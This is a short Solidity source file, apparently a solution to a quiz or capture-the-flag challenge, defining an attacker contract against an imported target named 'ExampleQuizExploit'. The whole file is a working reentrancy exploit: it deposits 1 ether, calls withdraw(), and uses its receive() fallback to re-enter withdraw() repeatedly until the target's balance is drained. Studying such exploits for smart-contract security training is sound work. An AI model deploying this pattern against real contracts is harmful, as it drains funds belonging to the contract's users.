pragma solidity 0.8.4;

import "./ExampleQuizExploit.sol";

contract sidduHEREAttacker {
    
    function attack(ExampleQuizExploit instance) public payable {
        require(msg.value >= 1 ether);
        instance.deposit{value: 1 ether}();
        instance.withdraw();
    }

    receive() external payable { 
        if(msg.sender.balance > 0) {
            ExampleQuizExploit(msg.sender).withdraw();
        }
    }

}